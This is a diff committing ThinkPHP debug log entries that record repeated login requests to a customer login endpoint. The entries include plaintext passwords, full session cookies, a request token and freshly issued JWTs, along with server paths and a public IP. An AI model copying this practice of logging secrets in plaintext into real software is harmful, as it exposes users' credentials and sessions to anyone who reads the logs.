+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:42:03+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.019458s] [吞吐率：51.39req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:42:03+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.019845s] [吞吐率：50.39req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:42:03+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.020025s] [吞吐率：49.94req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:42:03+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.020492s] [吞吐率：48.80req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:42:03+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.019162s] [吞吐率：52.19req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:42:10+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.028863s] [吞吐率：34.65req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:42:10+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.028349s] [吞吐率：35.27req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:42:11+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.017647s] [吞吐率：56.67req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:42:11+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.019779s] [吞吐率：50.56req/s] [内存消耗：2,138.72kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:42:17+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.017999s] [吞吐率：55.56req/s] [内存消耗：2,138.65kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:42:18+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.018739s] [吞吐率：53.36req/s] [内存消耗：2,138.65kb] [文件加载：39]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T16:42:57+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.064386s] [吞吐率：15.53req/s] [内存消耗：3,411.46kb] [文件加载：51]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/thinkphp/tpl/dispatch_jump.tpl [ array (
+  0 => 'code',
+  1 => 'msg',
+  2 => 'data',
+  3 => 'url',
+  4 => 'wait',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000346s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `customer` [ RunTime:0.029212s ]
+[ sql ] [ SQL ] SELECT `customer_id`,`customer_name`,`customer_password` FROM `customer` WHERE  `customer_name` = 'hello' LIMIT 1 [ RunTime:0.000395s ]
+[ sql ] [ SQL ] UPDATE `customer`  SET `token`='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MDk3NywibmJmIjoxNjEwNDQwOTc3LCJleHAiOjE2MTA0NDIxNzd9.q8XbcfE11L8ngxpYrxWPan3qojEzp_Tz6EoNrmWnz3s'  WHERE  `customer_name` = 'hello' [ RunTime:0.004524s ]
+---------------------------------------------------------------
+[ 2021-01-12T16:43:40+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.047878s] [吞吐率：20.89req/s] [内存消耗：3,316.80kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'customer_name=hello; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MDk3NywibmJmIjoxNjEwNDQwOTc3LCJleHAiOjE2MTA0NDIxNzd9.q8XbcfE11L8ngxpYrxWPan3qojEzp_Tz6EoNrmWnz3s; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000386s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `customer` [ RunTime:0.000757s ]
+[ sql ] [ SQL ] SELECT `customer_id`,`customer_name`,`customer_password` FROM `customer` WHERE  `customer_name` = 'hello' LIMIT 1 [ RunTime:0.000361s ]
+[ sql ] [ SQL ] UPDATE `customer`  SET `token`='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTAyMCwibmJmIjoxNjEwNDQxMDIwLCJleHAiOjE2MTA0NDIyMjB9.nJ7fFLHj8rLJ_CyeH4uOHobIXg2_MgG5w3zSIXVVBTc'  WHERE  `customer_name` = 'hello' [ RunTime:0.019373s ]
+---------------------------------------------------------------
+[ 2021-01-12T16:43:42+08:00 ] 115.27.214.243 POST 101.37.13.45/index.php/customer/login/dologin
+[运行时间：0.041382s] [吞吐率：24.17req/s] [内存消耗：3,316.80kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'customer',
+    1 => 'login',
+    2 => 'dologin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'origin' => 'http://101.37.13.45',
+  'accept-encoding' => 'gzip, deflate',
+  'cookie' => 'customer_name=hello; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTAyMCwibmJmIjoxNjEwNDQxMDIwLCJleHAiOjE2MTA0NDIyMjB9.nJ7fFLHj8rLJ_CyeH4uOHobIXg2_MgG5w3zSIXVVBTc; SESSIONID=80e95bcd-4334-45fc-9ec9-38a9ce962d7d.UypgaBQsXhxDLGb37ev_F1BcdeE; Path=/www/wwwroot/www.alicezxy.work/dorm_vue; layers=42; PHPSESSID=8rfk38cn7o5ft68f0sdk34on66; order=id%20desc; rank=a; uploadSize=1073741824; memSize=1839; ltd_end=-1; pro_end=-1; serverType=apache; request_token=GerFCPLhtxP0FR8rwIB0vP2sDmaiT8anbckimi9tEE22PSOR',
+  'connection' => 'keep-alive',
+  'accept' => 'application/json, text/plain, */*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+  'referer' => 'http://101.37.13.45/index.php/customer/login/index.html',
+  'accept-language' => 'zh-cn',
+  'content-type' => 'application/json;charset=utf-8',
+  'content-length' => '40',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'hello',
+  'password' => '123456',
+)
+[ info ] [ RUN ] app\customer\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/customer/controller/Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000396s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `customer` [ RunTime:0.000764s ]
+[ sql ] [ SQL ] SELECT `customer_id`,`customer_name`,`customer_password` FROM `customer` WHERE  `customer_name` = 'hello' LIMIT 1 [ RunTime:0.000347s ]
+[ sql ] [ SQL ] UPDATE `customer`  SET `token`='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiaGVsbG8iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYxMDQ0MTAyMiwibmJmIjoxNjEwNDQxMDIyLCJleHAiOjE2MTA0NDIyMjJ9.lUV8eDj17X7wQAoeeJN-4Q5DVYsL258WSyduebXIBqM'  WHERE  `customer_name` = 'hello' [ RunTime:0.005909s ]
